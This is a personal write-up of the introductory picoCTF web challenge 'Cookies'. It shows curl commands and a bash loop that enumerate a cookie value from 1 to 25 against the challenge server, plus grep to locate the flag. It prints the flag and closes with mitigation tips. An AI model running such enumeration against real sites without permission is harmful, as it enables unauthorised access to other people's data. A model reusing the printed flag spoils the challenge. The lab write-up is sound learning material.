## CTF: Web AY25
Challenge: Cookies

Category: web

Points:

Difficulty:  Introductory 

## Instructions

Who doesn't love cookies? Try to figure out the best one.

## Solution
Enter website asks to type name of a cookie.  
* inspcet and look at cookies
* when typing in normal cookie name cooike "Search" pops up doesn't seem speacial
* looking at Source code

  Found java scprit at the bottom  
  
      $(document).ready(function(){
        $(".close").click(function(){
            $("myAlert").alert("close");
        });
      });

There appears to be nothing of use in the java script better to focus more on the cookies
* Try to find right type of cookie to put into the search, inorder to get the flag as a respnse
* Found this is value of session cookie 

      rlWsMzkup2uyplV6J3fvVUDvByfvMTShM2IlVvjvITuuqPOxo2Imovq0VTSjpTIupvO0olOvMFOuVUMuoTyxVTAio2gcMF4vKK1qsD

Could be encoded?  
not roll 13 or 64base.

When looking at the name of cookies that pop up when searching a cookie name.
* each cookie has a diffrent number value 
    * figure out how to find all the cookie vlaues?  
Try to use curl   

copy curl the cookie
* Change the name number till I find the flag using 

      curl 'http://mercury.picoctf.net:29649/check' \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
        -H 'Accept-Language: en-US,en;q=0.9' \
        -H 'Cache-Control: max-age=0' \
        -H 'Connection: keep-alive' \
        -H 'Cookie: name=1' \
        -H 'Referer: http://mercury.picoctf.net:29649/' \
        -H 'Upgrade-Insecure-Requests: 1' \
        -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
        --insecure

 I made a bash code in order to copy all they cookies into files after the cookie is curled into the server

    #!/bin/bash  
    for i in $(seq 1 25);
    do
    touch ./holds/cookie$i
    echo made dir $i
    curl -o ./holds/cookie$i 'http://mercury.picoctf.net:29649/check' \
      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
      -H 'Accept-Language: en-US,en;q=0.9' \
      -H 'Cache-Control: max-age=0' \
      -H 'Connection: keep-alive' \
      -H "Cookie: name= ${i} " \
      -H 'Referer: http://mercury.picoctf.net:29649/' \
      -H 'Upgrade-Insecure-Requests: 1' \
      -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
      --insecure
    done

* Then to find which one had the flag 

      $ grep pico holds/*
      holds/cookie18: <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>

I thought of the grep after I found the flag by going into every folder and cating each file to look for the cookie. 

## Flag

picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}

## Mitigation

1. Don't store valuable information on a cookie.
2. Secure the cookies only accepting cookies from encrypted channels.
